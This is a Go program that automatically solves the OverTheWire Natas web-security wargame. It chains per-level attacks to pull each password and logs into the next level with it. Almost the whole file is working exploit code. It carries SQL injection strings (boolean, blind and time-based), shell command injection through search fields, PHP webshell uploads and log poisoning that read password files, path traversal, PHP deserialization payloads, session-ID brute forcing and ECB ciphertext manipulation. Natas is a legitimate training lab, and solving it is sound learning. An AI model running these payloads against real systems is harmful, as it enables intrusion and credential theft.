package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"time"

	"github.com/MJKWoolnough/memio"
)

var levels = [...]Grabber{
	//level 0
	Prefixed{grab, "The password for natas1 is ", 32},
	//level 1
	Prefixed{grab, "The password for natas2 is ", 32},
	//level 2
	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}}, // image @ /files/pixel.png, go to folder, find users.txt
	//level 3
	Path{Prefixed{grab, "natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
	//level 4
	Headers{Prefixed{grab, "The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
	//level 5
	Headers{Prefixed{grab, "The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
	//level 6
	Post{Prefixed{grab, "The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{grab, "$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
	//level 7
	Get{Prefixed{grab, "<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
	//level 8
	Post{
		Prefixed{grab, "The password for natas9 is ", 32},
		SetData{
			"submit": Text{"Submit Query"},
			"secret": Base64Decode{
				Reverse{
					Hex2Dec{
						Path{
							Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32},
							Text{"/index-source.html"},
						},
					},
				},
			},
		},
		nil,
	},
	//level 9
	Get{Prefixed{grab, "/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
	//level 10
	Get{Prefixed{grab, "/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
	//level 11
	Headers{
		Prefixed{grab, "The password for natas12 is ", 32},
		SetData{
			"Cookie": Combine{
				Text{"data="},
				Base64Encode{
					XOR{
						Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"},
						FindRepeating{
							XOR{
								Base64Decode{
									Cookie{"data"},
								},
								Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"},
							},
						},
					},
				},
			},
		},
	},
	//level 12
	Path{
		Prefixed{grab, "", 32},
		Combine{
			Text{"/"},
			Post{
				XPath{grab, "//a/@href"},
				SetData{
					"filename": Combine{
						XPath{grab, "//form/input[@name='filename']/@value"},
						Text{".php"},
					},
				},
				&File{
					XPath{grab, "//form/input[@type='file']/@name"},
					Text{"exploit.php"},
					memio.Buffer("<?php include(\"/etc/natas_webpass/natas13\"); ?>"),
				},
			},
		},
	},
	//level 13
	Path{
		Prefixed{grab, "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a", 32},
		Combine{
			Text{"/"},
			Post{
				XPath{grab, "//a/@href"},
				SetData{
					"filename": Combine{
						XPath{grab, "//form/input[@name='filename']/@value"},
						Text{".php"},
					},
				},
				&File{
					XPath{grab, "//form/input[@type='file']/@name"},
					Text{"exploit.php"},
					memio.Buffer("\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php include(\"/etc/natas_webpass/natas14\"); ?>"),
				},
			},
		},
	},
	//level 14
	Post{
		Prefixed{
			grab,
			"The password for natas15 is ",
			32,
		},
		SetData{
			"username": Text{"\" OR password != \"\" #"},
		},
		nil,
	},
	//level 15
	BruteForceString{
		Post{
			NotContain{grab, "This user doesn't exist."},
			SetData{},
			nil,
		},
		"username",
		"natas16\" AND password LIKE BINARY \"",
		"",
		"",
		"%",
	},
	//level 16
	BruteForceString{
		Post{
			NotContain{grab, "African"},
			SetData{},
			nil,
		},
		"needle",
		"^$(grep -E ",
		" /etc/natas_webpass/natas17)African",
		"^",
		".*",
	},
	//level 17
	BruteForceString{
		Post{
			TakesTime{grab, time.Second},
			SetData{},
			nil,
		},
		"username",
		"natas18\" AND IF (password LIKE BINARY \"",
		"\", SLEEP(1), null) AND password != \"",
		"",
		"%",
	},
	//level 18
	Headers{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				BruteForceRange{
					Headers{
						Contains{
							grab,
							"You are an admin.",
						},
						SetData{},
					},
					&NumRange{0, 640},
					"Cookie",
					"PHPSESSID=",
					"",
				},
			},
		},
	},
	//level 19
	Headers{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				BruteForceRange{
					Headers{
						Contains{
							grab,
							"You are an admin.",
						},
						SetData{},
					},
					RangeHex{
						RangeSuffix{
							&RangeList{
								&NumRange{10, 99},
								&NumRange{1000, 9999},
								&NumRange{100000, 999999},
								&NumRange{10000000, 99999999},
							},
							"-admin",
						},
					},
					"Cookie",
					"PHPSESSID=",
					"",
				},
			},
		},
	},
	//level 20
	Headers{
		LoadAll{

			Post{
				Headers{
					Contains{
						grab,
						"natas21",
					},
					SetData{"Cookie": Text{"PHPSESSID=1"}},
				},
				SetData{
					"name": Text{"a\nadmin 1"},
				},
				nil,
			},
			Prefixed{
				grab,
				"Password: ",
				32,
			},
		},
		SetData{"Cookie": Text{"PHPSESSID=1"}},
	},
	//level 21
	Headers{
		LoadAll{

			Host{
				Get{
					Post{
						Headers{
							grab,
							SetData{
								"Cookie": Combine{
									Text{"PHPSESSID="},
									Random{
										"Level21Cookie",
										"abcdefghijklmnopqrstuvwxyz",
										32,
									},
								},
							},
						},
						SetData{
							"admin":  Text{"1"},
							"submit": Text{""},
						},
						nil,
					},
					SetData{"debug": Text{"1"}},
				},
				Text{"natas21-experimenter.natas.labs.overthewire.org"},
			},
			Prefixed{
				grab,
				"Password: ",
				32,
			},
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				Random{
					"Level21Cookie",
					"abcdefghijklmnopqrstuvwxyz",
					32,
				},
			},
		},
	},
	//level 22
	Get{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{"revelio": Text{""}},
	},
	//level 23
	Get{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{"passwd": Text{"11iloveyou"}},
	},
	//level 24
	Get{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{"passwd[]": Text{}},
	},
	//level 25
	Headers{
		Prefixed{
			Get{
				Headers{
					grab,
					SetData{"User-Agent": Text{"<?php echo \"Password: \";include(\"/etc/natas_webpass/natas26\"); ?>"}},
				},
				SetData{
					"lang": Combine{
						Combine{
							Text{"....//....//....//....//....//var/www/natas/natas25/logs/natas25_"},
							Cookie{"PHPSESSID"},
						},
						Text{".log"},
					},
				},
			},
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				Cookie{"PHPSESSID"},
			},
		},
	},
	//level 26
	LoadAll{
		Headers{
			grab,
			SetData{
				"Cookie": Combine{
					Text{"drawing="},
					URLEncode{
						Base64Encode{
							PHPSerialize{
								"Logger",
								map[string]interface{}{
									"logFile": Combine{
										Combine{
											Text{"img/"},
											Random{
												"Level26LogFile",
												"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
												32,
											},
										},
										Text{".php"},
									},
									"initMsg": "",
									"exitMsg": "<?php echo \"Password: \";include(\"/etc/natas_webpass/natas27\");?>",
								},
							},
						},
					},
				},
			},
		},
		Path{
			Prefixed{
				grab,
				"Password: ",
				32,
			},
			Combine{
				Combine{
					Text{"/img/"},
					Random{
						"Level26LogFile",
						"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
						32,
					},
				},
				Text{".php"},
			},
		},
	},
	//level 27
	Get{
		LoadAll{
			BruteForceRange{ // Used for a timing attack
				Post{
					Contains{
						grab,
						"Welcome natas28!",
					},
					SetData{},
					nil,
				},
				&NumRange{0, 1000000},
				"attempt",
				"",
				"",
			},
			Prefixed{
				grab,
				"[password] =&gt; ",
				32,
			},
		},
		SetData{
			"username": Text{"natas28"},
			"password": Text{"a"},
		},
	},
	//level 28
	Prefixed{

		Get{
			Path{
				grab,
				Text{"/search.php"},
			},
			SetData{
				"query": Base64Encode{
					EBCBreaker{
						&Post{
							Base64Decode{
								URLDecode{
									Cut{
										GetHeader{"Location"},
										"=",
										1,
									},
								},
							},
							SetData{},
							nil,
						},
						"query",
						"SELECT CONCAT(username, 0x3A, password) AS joke FROM users #",
					},
				},
			},
		},
		"natas29:",
		32,
	},
	//level 29
	Prefixed{
		Get{
			grab,
			SetData{"file": Text{"|cat /etc/*_webpass/*30 "}},
		},
		"</html>\n",
		32,
	},
	//level 30
	Prefixed{
		PostBody{
			grab,
			memio.Buffer("username=natas31&password=" + url.QueryEscape("'' OR password != ''") + "&password=5"),
		},
		"natas31",
		32,
	},
	//level 31
	Prefixed{
		Query{
			Post{
				grab,
				SetData{"file": Text{"ARGV"}},
				&File{
					Text{"file"},
					Text{"1"},
					memio.Buffer("1"),
				},
			},
			Text{url.QueryEscape("/etc/natas_webpass/natas32")},
		},
		"<tr><th>",
		32,
	},
}

func e(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	var (
		level     uint
		password  string
		thisLevel int
	)
	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "natas0", "password for initial level")
	flag.Parse()

	r := http.Request{
		Header: make(http.Header),
	}

	http.DefaultClient.CheckRedirect = func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}

	defer func() {
		if err := recover(); err != nil {
			log.Printf("natas %2d: error: %s", thisLevel, err)
		}
	}()

	for n, grabber := range levels[level:] {
		thisLevel = int(level) + n

		log.Printf("natas %2d: Solving...", thisLevel)

		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", thisLevel))
		r.SetBasicAuth(fmt.Sprintf("natas%d", thisLevel), password)

		password = grabber.Grab(r)
		log.Printf("natas %2d: Password: %s", thisLevel, password)
	}
}
